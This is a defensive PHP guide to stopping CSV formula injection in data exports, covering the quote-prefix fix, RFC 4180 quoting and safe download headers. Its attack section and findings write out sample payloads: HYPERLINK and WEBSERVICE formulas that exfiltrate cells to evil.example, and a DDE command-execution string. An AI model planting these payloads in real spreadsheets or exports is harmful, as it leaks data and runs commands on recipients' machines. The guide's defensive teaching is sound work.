---
title: "Prevent CSV / Spreadsheet Formula Injection on Export"
category: security
tags: [csv, formula-injection, export, sanitization, rfc-4180]
difficulty: intermediate
related: [csv-bulk-import, data-export-api, sql-injection]
---

# Prevent CSV / Spreadsheet Formula Injection on Export

When your API exports user-supplied data as CSV, the danger is not on your server — it is on the **recipient's spreadsheet**. Excel, Google Sheets, and LibreOffice treat a cell whose text begins with `=`, `+`, `-`, `@`, a tab (`\t`), or a carriage return (`\r`) as a **formula**. An attacker who can get a string like `=cmd|'/c calc'!A0` or `=HYPERLINK("https://evil.example/?"&A1)` into your database will have it execute (DDE) or exfiltrate the row when an admin opens the exported file.

This is **CSV injection** (a.k.a. formula injection). It is an *output-encoding* problem at the export boundary — distinct from [SQL injection](sql-injection.md) (a query problem) and from [CSV bulk import](csv-bulk-import.md) (an input problem).

**Prerequisite**: You have an endpoint that returns rows as CSV.

---

## 1. The attack

Store this as a perfectly valid "display name", then export the table to CSV and open it in Excel:

```
=HYPERLINK("https://evil.example/leak?d="&A1&A2, "Click for refund")
```

- `=...HYPERLINK...` — exfiltrates neighbouring cells to an attacker URL when clicked.
- `=WEBSERVICE("https://evil.example/?"&A1)` — exfiltrates **with no click** in older Excel.
- `=cmd|'/c calc'!A0` — DDE; can run a local command after a confirmation dialog.

None of this touches your server. Your validation passed, your SQL was parameterized — and you still shipped a working exploit inside a "valid" CSV.

---

## 2. The fix: neutralize the leading character

The OWASP-recommended baseline: if a cell value starts with a dangerous character **and is not a plain number**, prefix it with a single quote (`'`). Excel then renders the cell as literal text.

```php
/**
 * Neutralize a value before writing it to a CSV cell so spreadsheet
 * software cannot interpret it as a formula.
 */
function neutralizeCsvCell(string $value): string
{
    if ($value === '') {
        return $value;
    }
    $dangerous = ['=', '+', '-', '@', "\t", "\r"];
    // Keep genuine numbers (incl. negatives like -50) intact; only quote
    // values that *start* dangerous and are not numeric.
    if (in_array($value[0], $dangerous, true) && !is_numeric($value)) {
        return "'" . $value;
    }

    return $value;
}
```

The `!is_numeric()` guard is the part most implementations get wrong: blindly prefixing every `-`/`+` turns the legitimate number `-50` into the text `'-50`, breaking sums in the recipient's sheet. Numbers pass through; only formula-shaped strings get quoted.

---

## 3. Combine with RFC 4180 quoting

Neutralization handles formulas; you still need correct quoting so values containing commas, quotes, or newlines do not break the column structure (a separate injection vector). Let `fputcsv` do it, with `escape=""` for strict [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180) behaviour (no backslash escaping):

```php
$fp = fopen('php://temp', 'r+');
foreach ($rows as $row) {
    fputcsv($fp, array_map('neutralizeCsvCell', $row), ',', '"', '');
}
rewind($fp);
$csv = stream_get_contents($fp);
```

Input → output (verified):

```
=1+1                       → '=1+1
+budget                    → '+budget
@home                      → '@home
-50                        → -50            (real number, untouched)
=cmd|'/c calc'!A0          → "'=cmd|'/c calc'!A0"
a,b                        → "a,b"
he said "hi"               → "he said ""hi"""
```

> `escape=""` matters: PHP's historical default escape character (`\`) produces output that is **not** RFC 4180 and that Excel mis-parses. Always pass `""`.

---

## 4. Return it as a download response

Build the PSR-7 response in the handler. Two more header-level details matter:

```php
$filename = 'export-' . date('Ymd') . '.csv';

return $responseFactory->createResponse(200)
    ->withHeader('Content-Type', 'text/csv; charset=UTF-8')
    // Sanitize the filename: strip CR/LF/quotes so it cannot inject extra headers.
    ->withHeader('Content-Disposition', 'attachment; filename="'
        . preg_replace('/[\r\n"]/', '', $filename) . '"')
    ->withBody($streamFactory->createStream("\u{FEFF}" . $csv));
```

- **`Content-Disposition: attachment`** forces a download instead of letting the browser render the bytes (defends against content sniffing).
- **`filename` sanitization** — never interpolate a user-controlled name without stripping `\r`, `\n`, and `"`; otherwise it becomes a header-injection vector.
- **BOM (`\u{FEFF}`)** — optional; makes Excel open UTF-8 correctly. It does not affect the injection defense.

Keep the neutralization in the export layer (a small `CsvWriter` value object), not scattered across handlers — the same guarantee then covers every export endpoint.

---

## Vulnerability Assessment

### V-01 — Formula injection via leading `=` ✅ SAFE

**Risk**: A stored value like `=1+1` or `=HYPERLINK(...)` executes when the CSV is opened.
**Finding**: SAFE — `neutralizeCsvCell()` prefixes `'`, so the cell is rendered as text (`'=1+1`).

---

### V-02 — DDE command execution (`=cmd|...`) ✅ SAFE

**Risk**: `=cmd|'/c calc'!A0` triggers DDE and can run a local command.
**Finding**: SAFE — the payload starts with `=` and is not numeric, so it is quoted (`"'=cmd|'/c calc'!A0"`).

---

### V-03 — Data exfiltration via `WEBSERVICE`/`HYPERLINK` ✅ SAFE

**Risk**: `=WEBSERVICE("https://evil/?"&A1)` leaks neighbouring cells, sometimes without a click.
**Finding**: SAFE — neutralized identically; the leading `=` is defused before the function name is reached.

---

### V-04 — Leading `+`, `-`, `@` triggers ✅ SAFE

**Risk**: Excel also evaluates cells beginning with `+`, `-`, and `@`.
**Finding**: SAFE — all four are in the `$dangerous` set; `+budget` → `'+budget`, `@home` → `'@home`.

---

### V-05 — Tab / carriage-return prefix bypass ✅ SAFE

**Risk**: A leading `\t` or `\r` is stripped by some parsers, exposing a `=` underneath (`\t=1+1`).
**Finding**: SAFE — `\t` and `\r` are themselves in the `$dangerous` set, so the whole cell is quoted before any stripping.

---

### V-06 — Column break via comma / quote / newline ✅ SAFE

**Risk**: A value like `a,b` or an embedded `"`/newline shifts data into the wrong columns (structural injection).
**Finding**: SAFE — `fputcsv(..., escape: '')` applies RFC 4180 quoting (`"a,b"`, `"he said ""hi"""`).

---

### V-07 — `Content-Disposition` filename header injection ✅ SAFE

**Risk**: A user-controlled export name containing `\r\n` injects additional response headers.
**Finding**: SAFE — the filename is passed through `preg_replace('/[\r\n"]/', '', ...)` before being placed in the header.

---

### V-08 — Content sniffing / inline rendering ✅ SAFE

**Risk**: Without `attachment`, a browser may render the CSV as HTML and execute embedded markup.
**Finding**: SAFE — `Content-Type: text/csv` + `Content-Disposition: attachment` force a download.

---

### V-09 — Legitimate negative numbers mangled ✅ SAFE (correctness)

**Risk**: Over-eager neutralization turns `-50` into text `'-50`, corrupting downstream sums.
**Finding**: SAFE — the `!is_numeric()` guard lets well-formed numbers (`-50`, `+1`, `-5e3`) pass through untouched.

---

### V-10 — Defense centralization ✅ SAFE

**Risk**: Per-handler ad-hoc CSV building lets one endpoint forget the neutralization.
**Finding**: SAFE (by design) — neutralization lives in a single export layer applied via `array_map`, so every column of every export is covered.

---

### VULN Summary

| ID | Vulnerability | Finding |
|----|---------------|---------|
| V-01 | Formula injection (`=`) | ✅ SAFE |
| V-02 | DDE command execution | ✅ SAFE |
| V-03 | `WEBSERVICE`/`HYPERLINK` exfiltration | ✅ SAFE |
| V-04 | `+` / `-` / `@` triggers | ✅ SAFE |
| V-05 | Tab / CR prefix bypass | ✅ SAFE |
| V-06 | Comma / quote / newline column break | ✅ SAFE |
| V-07 | Filename header injection | ✅ SAFE |
| V-08 | Content sniffing / inline render | ✅ SAFE |
| V-09 | Negative-number mangling | ✅ SAFE |
| V-10 | Defense centralization | ✅ SAFE |

**10 SAFE, 0 EXPOSED.** No critical findings. The neutralize-leading-character rule (with a numeric guard) plus RFC 4180 quoting and an `attachment` download response closes the CSV-injection surface. The one residual caveat is human: the neutralizing `'` is visible as a leading apostrophe in some non-spreadsheet CSV parsers — acceptable, since the alternative is code execution in the recipient's spreadsheet.

---

## Related

- [CSV bulk import](csv-bulk-import.md) — the input side (partial success, duplicate detection)
- [Data export API](data-export-api.md) — async token-protected export flow
- [SQL injection defense](sql-injection.md) — the query-side injection class
